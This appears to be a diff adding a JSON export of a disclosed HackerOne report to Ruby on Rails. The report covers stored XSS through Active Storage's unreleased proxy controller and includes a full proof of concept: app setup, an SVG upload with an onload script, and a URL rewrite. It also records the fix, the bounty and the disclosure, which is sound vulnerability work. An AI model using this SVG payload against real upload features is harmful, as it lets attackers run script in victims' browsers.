@@ -1,0 +1,354 @@
+{
+  "id": 949513,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDk1MTM=",
+  "url": "https://hackerone.com/reports/949513",
+  "title": "XSS by file (Active Storage `Proxying`)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-02T05:13:31.181Z",
+  "submitted_at": "2020-08-02T05:13:31.245Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-09-01T22:51:37.236Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-01T22:51:37.182Z",
+  "team_member_agreed_on_going_public_at": "2020-09-01T19:14:06.796Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\nI've seen similar issues with #407319 and #429868 occur with Active Storage's new File serving strategies `Proxying`.\n\nCommit is https://github.com/rails/rails/commit/dfb5a82b259e134eac89784ac4ace0c44d1b4aee.\n\n```ruby\n# https://github.com/rails/rails/blob/master/activestorage/app/controllers/concerns/active_storage/set_headers.rb#L9\n      response.headers[\"Content-Disposition\"] = ActionDispatch::Http::ContentDisposition.format \\\n        disposition: params[:disposition] || \"inline\", filename: blob.filename.\n```\n\n```ruby\n# https://github.com/rails/rails/blob/master/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb\n\n# Proxy files through application. This avoids having a redirect and makes files easier to cache.\nclass ActiveStorage::Blobs::ProxyController < ActiveStorage::BaseController\n  include ActiveStorage::SetBlob\n  include ActiveStorage::SetHeaders\n\n  def show\n    http_cache_forever public: true do\n      set_content_headers_from @blob\n      stream @blob\n    end\n  end\nend  \n```\n\nSince `inline` can be set regardless of the file type, XSS is possible when a malicious file is uploaded.\n\n### Proof of concept\n\n#### 1. Preparing the server\n\n```\n$ rails new proxy_xss --skip-bundle --skip-webpack-install\n$ cd proxy_xss/\n```\n\nEdit Gemfile.\n\n```ruby\nsource 'https://rubygems.org'\ngit_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\n\nruby '2.7.1'\n\ngem 'rails', github: \"rails/rails\", branch: \"master\"\ngem 'sqlite3', '~> 1.4'\ngem 'puma', '~> 4.1'\n\ngem 'bootsnap', '>= 1.4.2', require: false\n\ngroup :development do\n  gem 'listen', '~> 3.2'\nend\n```\n\n```\n$ bundle install\n...\n\n$ head Gemfile.lock\nGIT\n  remote: https://github.com/rails/rails.git\n  revision: 11f54e12b992f6c8d29fd9bedd89ac438a928a2f\n  branch: master\n  specs:\n    actioncable (6.1.0.alpha)\n      actionpack (= 6.1.0.alpha)\n      activesupport (= 6.1.0.alpha)\n      nio4r (~> 2.0)\n      websocket-driver (>= 0.6.1)\n```\n\n```\n$ bundle exec rails active_storage:install\n$ bundle exec rails g resource user name:text\n$ bundle exec rails db:migrate\n```\n\nEdit app files.\n\n```ruby\n# controllers/users_controller.rb\nclass UsersController < ApplicationController\n\n  def new\n    @user = User.new\n  end\n\n  def create\n    user = User.create!(user_params)\n    redirect_to \"/users/#{user.id}\"\n  end\n\n  def show\n    @user = User.find(params[:id])\n  end\n\n  private\n    def user_params\n      params.require(:user).permit(:name, :image)\n    end\nend\n```\n\n```ruby\n# models/user.rb\nclass User < ApplicationRecord\n  has_one_attached :image\nend\n```\n\n```erb\n# views/layouts/application.html.erb\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>ProxyXss</title>\n    <%= csrf_meta_tags %>\n    <%= csp_meta_tag %>\n  </head>\n\n  <body>\n    <%= yield %>\n  </body>\n</html>\n```\n\n```erb\n# views/user/new.html.erb\n<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>\n  <%= form.text_area :name %><br>\n  <%= form.file_field :image %><br>\n  <%= form.submit %>\n<% end %>\n```\n\n```erb\n# views/user/show.html.erb\n<% if @user.image.attached? %>\n  <%= image_tag @user.image %>\n<% end %>\n```\n\n#### 2. Obtain url\n\nStart server.\n\n```\nrails s\n```\n\nOpen `http://localhost:3000/users/new` in your browser, Upload the following file as `alert.svg`.\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns='http://www.w3.org/2000/svg' width=\"200px\" height=\"200px\" onload=\"javascript:alert(location)\">\n</svg>\n```\n\nAfter that, use the developer tool to obtain the redirected URL.\n\n```\nhttp://localhost:3000/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n```\n\n#### 3. XSS\n\nRewrite `redirect` in URL to `proxy` and alert will appear when opening URL directly in browser.\n\n```\nhttp://localhost:3000/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n```\n\n{F933309}\n\n## Impact\n\nXSS is possible if attacker can upload files using Active storage.\nThis commit has not been released yet, so it only affects services using Rails on the master branch.\n(Maybe `Hey` etc. https://gist.github.com/dhh/782fb925b57450da28c1e15656779556#file-gemfile-L3)\n\nIn addition, since the csp header is not output for the svg file (https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/http/content_security_policy.rb#L20), it can be avoided even if csp is set.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 933309,
+      "file_name": "__________2020-08-02_13.56.07.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y8cVzeAnppMhG3nekekqk4WM?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-02_13.56.07.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-02_13.56.07.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072412Z&X-Amz-Expires=2027&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b8aa2b300fd25c86d930c1ad4f99cde2079a9dd7e0bb39b10baa808c97eb8cc6",
+      "file_size": 579944,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-10-01T19:14:06.906Z",
+  "allow_singular_disclosure_after": -93874206.03865615,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "ali",
+    "prinzhorn",
+    "tvmbug"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 8847959,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @ooooooo_q,\n\nThanks for the report! We're still looking into this one and will let you know as soon as we have an update.",
+      "automated_response": false,
+      "created_at": "2020-08-04T19:27:14.390Z",
+      "updated_at": "2020-08-04T19:27:14.390Z",
+      "actor": {
+        "username": "jack_mccracken",
+        "cleared": false,
+        "verified": false,
+        "url": "/jack_mccracken",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 9061080,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-27T22:03:00.585Z",
+      "updated_at": "2020-08-27T22:03:00.585Z",
+      "actor": {
+        "username": "georgeclaghorn",
+        "cleared": false,
+        "verified": false,
+        "url": "/georgeclaghorn",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 9089447,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @ooooooo_q,\n\nSorry for the delay. I think [b221a4d](https://github.com/rails/rails/commit/b221a4dc43368a1b6f00476f7c5f6047c5c7eea4) in master addresses this. Mind confirming?",
+      "automated_response": false,
+      "created_at": "2020-08-31T15:33:06.397Z",
+      "updated_at": "2020-08-31T15:33:06.397Z",
+      "actor": {
+        "username": "georgeclaghorn",
+        "cleared": false,
+        "verified": false,
+        "url": "/georgeclaghorn",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 9092327,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @georgeclaghorn,\n\nI confirmed that commit. it seems there is no problem.",
+      "automated_response": false,
+      "created_at": "2020-08-31T20:02:20.067Z",
+      "updated_at": "2020-08-31T20:02:20.067Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 9092365,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thank you!",
+      "automated_response": false,
+      "created_at": "2020-08-31T20:11:02.634Z",
+      "updated_at": "2020-08-31T20:11:02.634Z",
+      "actor": {
+        "username": "georgeclaghorn",
+        "cleared": false,
+        "verified": false,
+        "url": "/georgeclaghorn",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 9103437,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-09-01T19:13:20.823Z",
+      "updated_at": "2020-09-01T19:13:20.823Z",
+      "actor": {
+        "url": "/rails",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Ruby on Rails"
+        }
+      },
+      "bounty_amount": "500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "rails",
+      "collaborator": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      }
+    },
+    {
+      "id": 9103447,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-09-01T19:14:06.826Z",
+      "updated_at": "2020-09-01T19:14:06.826Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "tenderlove",
+        "cleared": false,
+        "verified": false,
+        "url": "/tenderlove",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 9104549,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-09-01T22:51:37.209Z",
+      "updated_at": "2020-09-01T22:51:37.209Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 9104550,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-09-01T22:51:37.261Z",
+      "updated_at": "2020-09-01T22:51:37.261Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
